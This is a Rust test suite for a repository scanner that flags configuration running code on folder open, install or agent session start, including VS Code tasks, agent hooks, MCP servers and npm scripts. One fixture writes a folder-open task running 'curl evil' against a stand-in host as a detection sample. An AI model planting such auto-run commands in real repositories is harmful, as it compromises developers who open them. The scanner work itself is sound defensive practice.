//! End-to-end scans against the fixture repositories.

use onopen::finding::{ScanUnit, Severity};
use onopen::{ScanOptions, scan};
use std::path::PathBuf;

fn fixture(name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join(name)
}

fn scan_fixture(name: &str) -> ScanUnit {
    scan(&fixture(name), &ScanOptions::default()).expect("fixture should scan")
}

fn rules(unit: &ScanUnit) -> Vec<&str> {
    unit.findings.iter().map(|f| f.rule).collect()
}

#[test]
fn finds_vscode_task_that_runs_on_folder_open() {
    let unit = scan_fixture("trapped");
    let hit = unit
        .findings
        .iter()
        .find(|f| f.rule == "vscode/task-run-on-folder-open")
        .expect("folderOpen task should be reported");

    assert_eq!(f_severity(hit), Severity::Immediate);
    assert!(
        hit.command.contains("curl"),
        "command was {:?}",
        hit.command
    );
    assert!(hit.trigger.contains("folderOpen"));
}

#[test]
fn parses_jsonc_with_comments_and_trailing_commas() {
    // The trapped tasks.json is only readable if the JSONC pass works, so any
    // finding from that file proves the parser handled it.
    let unit = scan_fixture("trapped");
    assert!(
        rules(&unit).contains(&"vscode/task-run-on-folder-open"),
        "JSONC parsing failed; no findings from tasks.json"
    );
}

#[test]
fn finds_agent_session_start_hook() {
    let unit = scan_fixture("trapped");
    let hooks: Vec<_> = unit
        .findings
        .iter()
        .filter(|f| f.rule == "agent/command-hook")
        .collect();

    assert_eq!(hooks.len(), 2, "expected SessionStart and PreToolUse hooks");
    assert!(hooks.iter().any(|f| f.trigger.contains("SessionStart")));
    assert!(hooks.iter().any(|f| f.trigger.contains("PreToolUse")));
}

#[test]
fn flags_mcp_server_that_fetches_and_runs() {
    let unit = scan_fixture("trapped");
    let hit = unit
        .findings
        .iter()
        .find(|f| f.rule == "mcp/server-fetches-and-runs")
        .expect("npx-based MCP server should be reported");
    assert!(hit.command.contains("npx"));
}

#[test]
fn separates_install_scripts_from_publish_scripts() {
    let unit = scan_fixture("trapped");

    let install: Vec<_> = unit
        .findings
        .iter()
        .filter(|f| f.rule == "npm/install-lifecycle-script")
        .collect();
    assert_eq!(install.len(), 2, "preinstall and postinstall");
    assert!(install.iter().all(|f| f_severity(f) == Severity::Immediate));

    let deferred: Vec<_> = unit
        .findings
        .iter()
        .filter(|f| f.rule == "npm/other-lifecycle-script")
        .collect();
    assert_eq!(deferred.len(), 1, "prepublishOnly");
    assert_eq!(f_severity(deferred[0]), Severity::Deferred);
}

#[test]
fn treats_host_initialize_command_as_worse_than_container_commands() {
    let unit = scan_fixture("trapped");

    let host = unit
        .findings
        .iter()
        .find(|f| f.rule == "devcontainer/host-initialize-command")
        .expect("initializeCommand should be reported");
    assert_eq!(f_severity(host), Severity::Immediate);

    let inside = unit
        .findings
        .iter()
        .find(|f| f.rule == "devcontainer/container-lifecycle-command")
        .expect("postCreateCommand should be reported");
    assert_eq!(f_severity(inside), Severity::Deferred);
}

#[test]
fn flags_gemfile_that_shells_out() {
    let unit = scan_fixture("trapped");
    let hit = unit
        .findings
        .iter()
        .find(|f| f.rule == "bundler/gemfile-executes-ruby")
        .expect("system() in a Gemfile should be reported");
    assert!(hit.command.contains("curl"));
}

#[test]
fn reports_checked_in_hooks_as_deferred() {
    let unit = scan_fixture("trapped");
    let hit = unit
        .findings
        .iter()
        .find(|f| f.rule == "git/checked-in-hook")
        .expect(".githooks/pre-commit should be reported");
    assert_eq!(f_severity(hit), Severity::Deferred);
}

#[test]
fn flags_composer_install_scripts_but_not_ordinary_ones() {
    let unit = scan_fixture("trapped");
    let hits: Vec<_> = unit
        .findings
        .iter()
        .filter(|f| f.rule == "composer/lifecycle-script")
        .collect();

    assert_eq!(hits.len(), 2, "post-install-cmd and post-autoload-dump");
    assert!(
        !hits.iter().any(|f| f.trigger == "lint"),
        "a plain script is not a lifecycle hook"
    );
    assert!(hits.iter().all(|f| f_severity(f) == Severity::Immediate));
}

#[test]
fn flags_dependency_pulled_straight_from_git() {
    let unit = scan_fixture("trapped");
    assert!(rules(&unit).contains(&"npm/dependency-from-url"));
}

#[test]
fn clean_repository_has_no_immediate_findings() {
    let unit = scan_fixture("clean");
    let immediate: Vec<_> = unit
        .findings
        .iter()
        .filter(|f| f_severity(f) == Severity::Immediate)
        .collect();

    assert!(
        immediate.is_empty(),
        "clean fixture produced immediate findings: {immediate:#?}"
    );
}

#[test]
fn clean_repository_reports_the_files_it_inspected() {
    let unit = scan_fixture("clean");
    assert!(
        unit.cleared.iter().any(|p| p.contains("tasks.json")),
        "cleared list was {:?}",
        unit.cleared
    );
    assert!(unit.cleared.iter().any(|p| p.contains("package.json")));
}

#[test]
fn only_and_skip_narrow_the_run() {
    let only = ScanOptions {
        only: vec!["packages".into()],
        ..Default::default()
    };
    let unit = scan(&fixture("trapped"), &only).unwrap();
    assert!(unit.findings.iter().all(|f| {
        f.rule.starts_with("npm/")
            || f.rule.starts_with("composer/")
            || f.rule.starts_with("bundler/")
    }));

    let skip = ScanOptions {
        skip: vec!["packages".into()],
        ..Default::default()
    };
    let unit = scan(&fixture("trapped"), &skip).unwrap();
    assert!(unit.findings.iter().all(|f| !f.rule.starts_with("npm/")));
}

#[test]
fn unknown_scanner_name_is_an_error() {
    let opts = ScanOptions {
        only: vec!["nope".into()],
        ..Default::default()
    };
    let err = scan(&fixture("clean"), &opts).unwrap_err();
    assert!(err.to_string().contains("unknown scanner"));
}

fn f_severity(f: &onopen::finding::Finding) -> Severity {
    f.severity
}

// ---------------------------------------------------------------------------
// Monorepos
//
// Before 0.2 the scanner only read the top directory, so a repository whose
// hostile config lived one workspace down came back clean. These cover the
// walk, the path rewriting, and the directories it must refuse to enter.
// ---------------------------------------------------------------------------

#[test]
fn finds_execution_paths_inside_workspaces() {
    let unit = scan_fixture("monorepo");

    let api = unit
        .findings
        .iter()
        .find(|f| f.rule == "vscode/task-run-on-folder-open")
        .expect("a folderOpen task one workspace down should be reported");
    assert_eq!(
        api.file, "packages/api/.vscode/tasks.json",
        "the path must read from the top of the scan, not from the workspace"
    );

    let web = unit
        .findings
        .iter()
        .find(|f| f.rule == "agent/command-hook")
        .expect("an agent hook one workspace down should be reported");
    assert_eq!(web.file, "packages/web/.claude/settings.json");
}

// The rule that dependency directories are never entered is covered by
// `discover::tests::skips_dependency_directories`, which owns the walk and
// fails when the exclusion is removed. An end-to-end version of it here kept
// passing with the rule deliberately broken, so it proved nothing and is not
// worth the confidence it implied.

#[test]
fn depth_zero_restores_the_root_only_behaviour() {
    let opts = ScanOptions {
        max_depth: 0,
        ..Default::default()
    };
    let unit = scan(&fixture("monorepo"), &opts).unwrap();
    assert!(
        unit.findings.iter().all(|f| !f.file.contains('/')),
        "depth 0 must not descend: {:#?}",
        unit.findings
    );
}

#[test]
fn the_single_project_fixtures_are_unaffected_by_the_walk() {
    // The trapped fixture has no sub-projects, so recursion must not change
    // what it reports or how the paths read.
    let unit = scan_fixture("trapped");
    assert!(
        unit.findings.iter().all(|f| !f.file.starts_with('/')),
        "paths must stay relative"
    );
    assert!(
        unit.findings.iter().any(|f| f.file == ".vscode/tasks.json"),
        "root-level paths must not gain a prefix"
    );
}

// ---------------------------------------------------------------------------
// Suppression
//
// A team adopting the scanner needs to silence findings it has already read,
// or the first false positive is also the last run. The rule these cover is
// that silencing is never invisible: what an ignore file hides is still
// counted and still reportable.
// ---------------------------------------------------------------------------

fn trapped_with_ignore(contents: &str) -> (PathBuf, onopen::finding::ScanUnit) {
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let root = std::env::temp_dir().join(format!("onopen-ignore-{stamp}"));
    std::fs::create_dir_all(root.join(".vscode")).unwrap();
    std::fs::write(
        root.join(".vscode/tasks.json"),
        r#"{"tasks":[{"label":"boot","command":"curl evil","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();
    std::fs::write(
        root.join("package.json"),
        r#"{"scripts":{"preinstall":"node ./build.js"}}"#,
    )
    .unwrap();
    std::fs::write(root.join(".onopenignore"), contents).unwrap();

    let unit = scan(&root, &ScanOptions::default()).unwrap();
    (root, unit)
}

#[test]
fn an_ignore_file_silences_only_what_it_names() {
    let (_root, unit) = trapped_with_ignore("npm/install-lifecycle-script  package.json\n");

    assert_eq!(unit.suppressed.len(), 1, "the install script was named");
    assert_eq!(unit.suppressed[0].file, "package.json");
    assert!(
        unit.findings
            .iter()
            .any(|f| f.rule == "vscode/task-run-on-folder-open"),
        "an unnamed rule must still be reported: {:#?}",
        unit.findings
    );
}

#[test]
fn silenced_findings_are_kept_rather_than_dropped() {
    // The count is what stops an ignore file from making a repository look
    // clean without saying so, and it only exists if they are kept.
    let (_root, unit) = trapped_with_ignore("*  *.json\n");
    assert!(!unit.suppressed.is_empty());
    assert!(
        unit.suppressed.iter().all(|f| !f.command.is_empty()),
        "suppressed findings keep their detail so they can be listed"
    );
}

#[test]
fn a_repository_without_an_ignore_file_is_unaffected() {
    let (_root, unit) = trapped_with_ignore("# nothing silenced here\n");
    assert!(unit.suppressed.is_empty());
    assert_eq!(unit.findings.len(), 2);
}

#[test]
fn a_missing_explicit_ignore_file_is_an_error() {
    // A typo in --ignore-file must not silently scan with no suppressions at
    // all: that would hide the mistake behind a clean-looking report.
    let opts = ScanOptions {
        ignore_file: Some(PathBuf::from("does-not-exist.onopenignore")),
        ..Default::default()
    };
    let err = scan(&fixture("clean"), &opts).unwrap_err();
    assert!(err.to_string().contains("ignore file not found"));
}

// ---------------------------------------------------------------------------
// Rule coverage
//
// Half the rule set had no test asserting it. A rule with no test is a rule
// that can stop firing without anything going red, and a detection that
// silently stops firing is indistinguishable from a repository that is clean.
// ---------------------------------------------------------------------------

fn hit<'a>(unit: &'a ScanUnit, rule: &str) -> &'a onopen::finding::Finding {
    unit.findings
        .iter()
        .find(|f| f.rule == rule)
        .unwrap_or_else(|| panic!("{rule} should have fired; got {:?}", rules(unit)))
}

#[test]
fn reports_workspace_settings_that_hand_an_extension_a_binary() {
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "vscode/setting-runs-binary");
    assert_eq!(f_severity(f), Severity::Immediate);
    assert!(f.trigger.contains("rust-analyzer.server.path"));
}

#[test]
fn reports_environment_injected_into_every_terminal() {
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "vscode/terminal-env-injection");
    // Deferred: it lands in the environment now, and runs when a terminal opens.
    assert_eq!(f_severity(f), Severity::Deferred);
    assert!(f.command.contains("preload.js"));
}

#[test]
fn reports_a_task_that_runs_before_debugging() {
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "vscode/pre-launch-task");
    assert_eq!(f_severity(f), Severity::Deferred);
}

#[test]
fn reports_a_runtime_shipped_in_the_repository_but_not_the_file_being_debugged() {
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "vscode/launch-workspace-binary");
    assert_eq!(f_severity(f), Severity::Note);
    assert!(
        f.trigger.contains("runtimeExecutable"),
        "the interpreter is the finding, not the program"
    );

    // `program` pointing at a source file in the repository is what debugging
    // is. Reporting it fires on nearly every launch.json ever written, and a
    // scanner that cries wolf on the ordinary case gets uninstalled.
    assert!(
        !unit
            .findings
            .iter()
            .any(|f| f.trigger.starts_with("program")),
        "a source file named as the debug target is not a finding"
    );
}

#[test]
fn reports_cursor_environment_commands() {
    let unit = scan_fixture("trapped");
    let found: Vec<_> = unit
        .findings
        .iter()
        .filter(|f| f.rule == "agent/cursor-environment-command")
        .collect();
    assert_eq!(found.len(), 2, "install and start both run");
    assert!(found.iter().all(|f| f_severity(f) == Severity::Immediate));
}

#[test]
fn reports_a_blanket_permission_allowlist_as_a_note() {
    // It executes nothing by itself. It removes the prompt that would have
    // caught something else executing, which is a different kind of problem.
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "agent/broad-permission-allow");
    assert_eq!(f_severity(f), Severity::Note);
}

#[test]
fn separates_mcp_servers_that_fetch_from_those_that_only_spawn() {
    let unit = scan_fixture("trapped");
    let spawns = hit(&unit, "mcp/server-spawns-process");
    let fetches = hit(&unit, "mcp/server-fetches-and-runs");

    assert_eq!(f_severity(spawns), Severity::Immediate);
    assert_eq!(f_severity(fetches), Severity::Immediate);
    assert!(
        fetches.command.contains("npx"),
        "the fetch-and-run rule is the one with no lockfile behind it"
    );
    assert!(!spawns.command.contains("npx"));
}

#[test]
fn reports_a_remote_mcp_server_as_a_note() {
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "mcp/remote-server");
    // Nothing runs locally; the session's tool traffic goes somewhere else.
    assert_eq!(f_severity(f), Severity::Note);
    assert!(f.command.starts_with("https://"));
}

#[test]
fn reports_devcontainer_features_pulled_from_a_registry() {
    let unit = scan_fixture("trapped");
    let f = hit(&unit, "devcontainer/feature");
    assert_eq!(f_severity(f), Severity::Note);
}

#[test]
fn the_clean_fixture_reports_nothing_at_all() {
    // Stronger than "no immediate findings", and deliberately so: every config
    // file in the clean fixture is the ordinary version of a file the trapped
    // one weaponises. A single note here means a rule fires on a layout that
    // millions of repositories have, and that is how a scanner gets ignored.
    let unit = scan_fixture("clean");
    assert!(
        unit.findings.is_empty(),
        "the clean fixture must stay clean: {:#?}",
        unit.findings
    );
    assert!(unit.unreadable.is_empty());
}
